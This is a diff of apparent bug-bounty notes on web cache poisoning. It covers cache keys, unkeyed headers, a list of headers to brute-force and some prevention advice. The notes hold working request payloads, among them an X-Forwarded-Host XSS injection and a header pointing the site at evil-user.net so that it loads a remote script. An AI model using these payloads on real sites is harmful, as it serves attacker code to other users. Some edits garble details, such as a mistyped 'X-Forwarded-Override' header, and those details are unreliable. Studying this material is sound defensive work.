@@ -1,9 +1,9 @@
-Web Cache Poisoning
+# Web Cache Poisoning
 A cache poisoning attack uses an HTTP request to trick an origin web server into 
 responding with a harmful resource that has the same cache key as a clean request. 
 As a result, the poisoned resource gets cached and served to other users.
 
-Cache Keys
+# Cache Keys
 A CDN like Cloudflare relies on cache keys to compare new requests against cached resources. 
 The CDN then determines whether the resource should be served from the cache or 
 requested directly from the origin web server.
@@ -25,8 +25,25 @@ and the rest are unkeyed inputs.
 Almost all cache keys include at least the path and host, but other header values may also be used. 
 Sometimes, only selected parts and parameters of the path are keyed, rather than the entire path
 
+# Cache-control directives
+One of the challenges when constructing a web cache poisoning attack is ensuring that the harmful 
+response gets cached. This can involve a lot of manual trial and error to study how the cache behaves.
 
-Prevention
+> HTTP/1.1 200 OK
+> Via: 1.1 varnish-v4
+> Age: 174
+> Cache-Control: public, max-age=1800
+
+> See discreet poisoning below.
+
+# Vary Header
+The rudimentary way that the Vary header is often used can also provide attackers with a helping hand. 
+The Vary header specifies a list of additional headers that should be treated as 
+part of the cache key even if they are normally unkeyed.
+Note: Some CDNs, such as Cloudflare, ignore the Vary header.
+> See Selective Poisoning below.
+
+# Prevention
 Only cache files that are truly static
 Review the caching configuration for your origin web server and ensure you are caching 
 files that are static and do not depend on user input in any way. 
@@ -38,7 +55,7 @@ Client-side vulnerabilities are often exploited through HTTP headers,
 including cross-site scripting (XSS). 
 In general, you should not trust the data in HTTP headers and as such:
 Do not rely on values in HTTP headers if they are not part of your cache key.
-Never return HTTP headers to users in cached content.
+Never return HTTP headers to users in cached cont> ent.
 Do not trust GET request bodies
 Cloudflare caches contents of GET request bodies, but they are not included in the cache key. 
 GET request bodies should be considered untrusted and should not modify the contents of a response. 
@@ -48,6 +65,7 @@ Cache Poisoning Web Apps with HTTP Headers
 > Accept_Encoding: br.  Gareth Used this on IG, When Accept-Encoding is in the Cache Key
 > X-Forwarded-Port see https://hackerone.com/reports/409370
 > X-Forwarded-Host
+> X-Forwarded-Proto: http
 > X-Forwarded-Server
 > X-Host
 > X-Original-URL 
@@ -55,20 +73,23 @@ Cache Poisoning Web Apps with HTTP Headers
 > X-Forwarded-SSL
 > Transfer-Encoding albinowax used zTRANSFER-ENCODING on bitbucket.
 > Content-Type: <invalid_value>
-> x-http-method-override supported by GCP buckets
-x-http-method-override: HEAD if cached, returns an empty response
-x-http-method-override: PURGE, try if enabled.
+X-Forwarded-Override: supported by GCP buckets
+> X-Forwarded-Override: HEAD if cached, returns an empty response
+> X-Forwarded-Override: PURGE, try if enabled.
 Find other targets using GCP buckets and test 
 Moral of the story, brute force cache poisoning headers 
 > X-Forwarded-Scheme - Rack Middleware
-> x-forwarded-scheme: http               results into a 301 redirect to the same location.
+> X-Forwarded-Scheme: http               results into a 301 redirect to the same location.
 If the response is cached by a CDN, it would cause a redirect loop, denying access to the file
 
+# Using multiple headers to exploit web cache poisoning
 Max bounty $3k Exploit
-GET /main/static.js HTTP/1.1
+> GET /main/static.js HTTP/1.1
 > Host: redacted.com
-> x-forwarded-scheme: https
+> X-Forwarded-Scheme: https
 > X-Forwarded-Host: <evil.com>
+
+also check X-Forwarded-Proto: http 
 
 > Authorization:        crafted headers      see https://hackerone.com/reports/1173153
 // Write ParamMiner,
@@ -101,6 +122,31 @@ Bypassing WAF <PHP Frameworks>
 > HTTP/1.1 200 OK
 > ...
 > Please log in
+
+
+# XSS Payload Example
+> GET /en?region=uk HTTP/1.1
+> Host: innocent-website.com
+> X-Forwarded-Host: a."><script>alert(1)</script>"
+
+> HTTP/1.1 200 OK
+> Cache-Control: public
+> <meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
+
+# Unsafe Handling of resource imports
+> GET / HTTP/1.1
+> Host: innocent-website.com
+> X-Forwarded-Host: evil-user.net
+
+> HTTP/1.1 200 OK
+> <script src="https://evil-user.net/static/analytics.js"></script>
+
+# Exploit cookie-handling vulnerabilities
+> GET /blog/post.php?mobile=1 HTTP/1.1
+> Host: innocent-website.com
+> Cookie: language=pl;
+Notice the unkeyed cookie language=pl. when cached, and served to 
+en-gb users, i.e a mild web cache poisoning
 
 DEMO Script 
 `
@@ -143,11 +189,13 @@ DEMO Script
 </html>
 `
 
-Discreet Poisoning : Timing the resource to determin exactly when a cache expires 
-to send a req to potential get a new cache
-Headers like max-age offers an insight into when the cache expires. 
+# Web Cache Entanglement
+## Discreet Poisoning: 
+Timing the resource to determine exactly when a cache expires 
+to send a req to potential get a new cache. Headers like max-age offers an insight into when the cache expires. 
 
-Selective Poisoning : HTTP Headers such as Vary tells the front-end which 
+## Selective Poisoning: 
+HTTP Headers such as Vary tells the front-end which 
 other headers should be part of the cache key, even though some CDNs like
 cloudflare ignores the Vary header, it means a header in the Vary header
 may be part of the cache key, if this is the case, it means you can tailor
@@ -158,9 +206,8 @@ The 'CF-Cache-Status' header here is an indicator that Cloudflare is considering
 spite of this the response was never actually cached. I speculated that Cloudflare's refusal to cache this might be
 related to the session_id cookie, and retried with that cookie present:
 
-WHich cached did I poison?
-target.com/cdn-cgi/trace
-
+# Which cache did I poison?
+> target.com/cdn-cgi/trace
 On Resp
 > Cache-­Control: max­age=0, private, must­revalidate
 > HTTP/1.1 200 OK
@@ -168,8 +215,7 @@ Bc CF won't cache Cache-­Control: private resp, when you get this,
 you can try other pages on the site that is cacheable.
 
 
-Web Cache Entanglement
-Prerequisites
+# Web Cache Entanglement Prerequisites
 Cache Oracle: Cacheable page of the target
 Confirmation: The ability to clearly identify if a cache happened.
 Ideal: If the Cache O returns the entire URL or at least 1 q qarameters 
